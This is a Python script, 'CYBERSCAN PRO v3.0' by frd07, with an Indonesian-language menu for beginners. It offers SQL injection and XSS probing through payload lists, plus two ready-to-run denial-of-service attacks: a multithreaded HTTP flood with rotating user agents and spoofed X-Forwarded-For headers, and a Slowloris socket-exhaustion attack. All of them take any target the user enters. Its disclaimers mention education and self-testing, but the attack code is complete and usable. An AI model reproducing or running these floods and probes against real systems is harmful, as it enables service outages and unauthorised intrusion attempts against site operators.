#!/usr/bin/env python3
# ============================================================
# TOOL: CYBERSCAN PRO by frd07
# VERSION: 3.0 (Easy Mode - Untuk Pemula)
# ============================================================

import os
import sys
import time
import random
import threading
import requests
import socket
from urllib.parse import urlparse, urljoin

# Auto install dependencies
try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama")
    from colorama import init, Fore, Style, Back
    init(autoreset=True)

# ========== FUNGSI BANTUAN ==========
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def pause():
    input(Fore.CYAN + "\nTekan Enter untuk kembali ke menu..." + Style.RESET_ALL)

def banner():
    clear()
    print(Fore.CYAN + "="*60)
    print(Fore.MAGENTA + "   FRD07 - CYBERSCAN PRO v3.0".center(60))
    print(Fore.YELLOW + "   Easy Mode - Untuk Pembelajaran".center(60))
    print(Fore.CYAN + "="*60)
    print(Fore.GREEN + "   [*] Fitur: Cek Kerentanan | DDoS | Panduan")
    print(Fore.CYAN + "="*60 + "\n")

def loading(msg="Memproses", duration=1):
    print(Fore.YELLOW + msg, end="")
    for _ in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print(" Selesai!" + Style.RESET_ALL)

def get_input(prompt, required=True):
    while True:
        val = input(Fore.YELLOW + prompt + Style.RESET_ALL).strip()
        if val or not required:
            return val
        print(Fore.RED + "Tidak boleh kosong!")

# ========== FITUR 1: PANDUAN LENGKAP ==========
def panduan():
    banner()
    print(Fore.CYAN + "[ PANDUAN PENGGUNAAN TOOL ]\n")
    print(Fore.GREEN + "1. CEK KERENTANAN WEBSITE")
    print("   - Masukkan URL website yang ingin diuji (contoh: http://testphp.vulnweb.com)")
    print("   - Tool akan menguji SQL Injection dan XSS secara otomatis")
    print("   - Hasil menunjukkan apakah website rentan atau tidak\n")
    print(Fore.GREEN + "2. FITUR DDoS")
    print("   - HTTP Flood: Mengirim banyak request ke server (Layer 7)")
    print("   - Slowloris: Membuka koneksi lambat sampai server kehabisan resource (Layer 4)")
    print("   - Hanya gunakan untuk website milik sendiri atau izin!\n")
    print(Fore.GREEN + "3. CATATAN PENTING")
    print("   - Tool ini untuk EDUKASI dan PENGUJIAN SISTEM SENDIRI")
    print("   - Menyerang website orang tanpa izin adalah ILEGAL")
    print("   - Penulis tidak bertanggung jawab atas penyalahgunaan\n")
    pause()

# ========== FITUR 2: CEK SQL INJECTION ==========
def cek_sqli():
    banner()
    print(Fore.CYAN + "[ CEK KERENTANAN SQL INJECTION ]\n")
    url = get_input("Masukkan URL target (dengan parameter GET, contoh: http://site.com/page?id=1): ")
    # Validasi apakah ada parameter GET
    if '?' not in url:
        print(Fore.RED + "URL harus mengandung parameter GET (tanda tanya ?). Contoh: ?id=1")
        pause()
        return
    
    # Payload SQLi sederhana
    payloads = [
        "'", 
        "\"", 
        "1' OR '1'='1", 
        "1\" OR \"1\"=\"1", 
        "1' OR 1=1-- -",
        "1' ORDER BY 1-- -",
        "1' UNION SELECT NULL-- -"
    ]
    
    print(Fore.YELLOW + f"\n[*] Menguji {len(payloads)} payload SQL Injection...\n")
    vulnerable = False
    
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            # Deteksi error database
            if any(keyword in r.text.lower() for keyword in ['sql', 'mysql', 'syntax', 'unclosed', 'warning', 'odbc']):
                print(Fore.RED + f"[!] POTENSI SQLi DENGAN PAYLOAD: {payload}")
                vulnerable = True
            else:
                print(Fore.GREEN + f"[✓] {payload} -> aman")
        except Exception as e:
            print(Fore.RED + f"[✗] Gagal mengakses: {e}")
    
    if vulnerable:
        print(Fore.RED + "\n[!] WEBSITE INI BERKEMUNGKINAN RENTAN SQL INJECTION!")
        print(Fore.YELLOW + "    Rekomendasi: Gunakan parameterized query atau ORM.")
    else:
        print(Fore.GREEN + "\n[✓] Tidak ditemukan kerentanan SQL Injection yang jelas.")
    pause()

# ========== FITUR 3: CEK XSS ==========
def cek_xss():
    banner()
    print(Fore.CYAN + "[ CEK KERENTANAN XSS (Cross Site Scripting) ]\n")
    url = get_input("Masukkan URL target (dengan parameter GET, contoh: http://site.com/search?q=test): ")
    if '?' not in url:
        print(Fore.RED + "URL harus mengandung parameter GET!")
        pause()
        return
    
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>"
    ]
    
    print(Fore.YELLOW + f"\n[*] Menguji {len(payloads)} payload XSS...\n")
    vulnerable = False
    
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                print(Fore.RED + f"[!] POTENSI XSS DENGAN PAYLOAD: {payload}")
                vulnerable = True
            else:
                print(Fore.GREEN + f"[✓] {payload[:30]}... -> aman")
        except:
            print(Fore.RED + f"[✗] Gagal mengakses")
    
    if vulnerable:
        print(Fore.RED + "\n[!] WEBSITE INI BERKEMUNGKINAN RENTAN XSS!")
        print(Fore.YELLOW + "    Rekomendasi: Gunakan encoding output dan CSP header.")
    else:
        print(Fore.GREEN + "\n[✓] Tidak ditemukan kerentanan XSS yang jelas.")
    pause()

# ========== FITUR 4: DDOS HTTP FLOOD DENGAN PANDUAN ==========
def ddos_http():
    banner()
    print(Fore.CYAN + "[ DDOS HTTP FLOOD - LAYER 7 ]\n")
    print(Fore.YELLOW + "PANDUAN: Serangan ini mengirim ribuan request HTTP ke server target.")
    print("         Hanya efektif untuk server yang tidak memiliki proteksi DDoS.")
    print("         Gunakan dengan bijak dan hanya untuk pengujian sendiri.\n")
    
    url = get_input("URL target (http:// atau https://): ")
    if not url.startswith(('http://','https://')):
        url = 'http://' + url
    
    try:
        threads = int(get_input("Jumlah thread (100-1000, sesuai kemampuan koneksi Anda): "))
        duration = int(get_input("Durasi serangan dalam detik (10-300): "))
    except ValueError:
        print(Fore.RED + "Input harus angka!")
        pause()
        return
    
    print(Fore.RED + f"\n[!] PERINGATAN: Anda akan menyerang {url} dengan {threads} thread selama {duration} detik!")
    confirm = input(Fore.YELLOW + "Ketik 'YA' untuk lanjut: ")
    if confirm != "YA":
        print("Dibatalkan.")
        pause()
        return
    
    stop = False
    end_time = time.time() + duration
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 11)",
        "CyberScanPro/3.0"
    ]
    
    def attack():
        session = requests.Session()
        while not stop and time.time() < end_time:
            try:
                headers = {"User-Agent": random.choice(ua_list), "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"}
                session.get(url, headers=headers, timeout=3)
                session.post(url, data={"x": random.randint(1,9999)}, headers=headers, timeout=3)
                print(Fore.GREEN + "✓", end="", flush=True)
            except:
                print(Fore.RED + "✗", end="", flush=True)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    print(Fore.CYAN + f"\n[+] SERANGAN DIMULAI! Tekan Ctrl+C untuk menghentikan lebih awal.\n")
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        stop = True
        print(Fore.RED + "\n[!] Serangan dihentikan oleh pengguna.")
    
    stop = True
    print(Fore.GREEN + "\n[✓] Serangan selesai.")
    pause()

# ========== FITUR 5: DDOS SLOWLORIS DENGAN PANDUAN ==========
def ddos_slowloris():
    banner()
    print(Fore.CYAN + "[ DDOS SLOWLORIS - LAYER 4 ]\n")
    print(Fore.YELLOW + "PANDUAN: Serangan ini membuka banyak koneksi lambat ke server web,")
    print("         mengirim header parsial secara perlahan sehingga server kehabisan")
    print("         koneksi yang tersedia. Efektif untuk server Apache/IIS tanpa proteksi.\n")
    
    target = get_input("Target IP atau domain (contoh: 192.168.1.1 atau example.com): ")
    try:
        port = int(get_input("Port (biasanya 80 untuk HTTP, 443 untuk HTTPS): "))
    except:
        print(Fore.RED + "Port harus angka!")
        pause()
        return
    
    try:
        sockets_count = int(get_input("Jumlah koneksi (100-500): "))
        duration = int(get_input("Durasi serangan (detik): "))
    except:
        print(Fore.RED + "Angka tidak valid!")
        pause()
        return
    
    print(Fore.RED + f"\n[!] PERINGATAN: Menyerang {target}:{port} dengan {sockets_count} koneksi selama {duration} detik!")
    confirm = input(Fore.YELLOW + "Ketik 'YA' untuk lanjut: ")
    if confirm != "YA":
        print("Dibatalkan.")
        pause()
        return
    
    stop = False
    end_time = time.time() + duration
    sockets_list = []
    
    # Buat koneksi awal
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            sockets_list.append(s)
            print(Fore.GREEN + "✓", end="", flush=True)
        except:
            print(Fore.RED + "✗", end="", flush=True)
    print("\n")
    
    print(Fore.CYAN + f"[+] Slowloris aktif dengan {len(sockets_list)} koneksi.\n")
    while not stop and time.time() < end_time:
        for s in sockets_list[:]:
            try:
                s.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                print(Fore.GREEN + ".", end="", flush=True)
            except:
                sockets_list.remove(s)
                print(Fore.RED + "x", end="", flush=True)
        time.sleep(5)
    stop = True
    print(Fore.GREEN + "\n[✓] Slowloris selesai.")
    pause()

# ========== MENU UTAMA ==========
def main():
    while True:
        banner()
        menu = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════╗
{Fore.CYAN}║  {Fore.GREEN}[1] {Fore.YELLOW}Cek Kerentanan SQL Injection               {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[2] {Fore.YELLOW}Cek Kerentanan XSS (Cross Site Scripting)  {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[3] {Fore.YELLOW}DDoS HTTP Flood (Layer 7)                   {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[4] {Fore.YELLOW}DDoS Slowloris (Layer 4)                    {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[5] {Fore.YELLOW}📘 Panduan Lengkap                          {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[0] {Fore.YELLOW}Keluar                                      {Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════════════════════╝
        """
        print(menu)
        pilihan = input(Fore.MAGENTA + "Pilih menu (0-5): " + Style.RESET_ALL)
        
        if pilihan == "1":
            cek_sqli()
        elif pilihan == "2":
            cek_xss()
        elif pilihan == "3":
            ddos_http()
        elif pilihan == "4":
            ddos_slowloris()
        elif pilihan == "5":
            panduan()
        elif pilihan == "0":
            print(Fore.GREEN + "\nTerima kasih telah menggunakan CYBERSCAN PRO. Iko sayang kamu selalu 💗")
            sys.exit(0)
        else:
            print(Fore.RED + "Pilihan tidak valid!")
            time.sleep(1)

if __name__ == "__main__":
    main()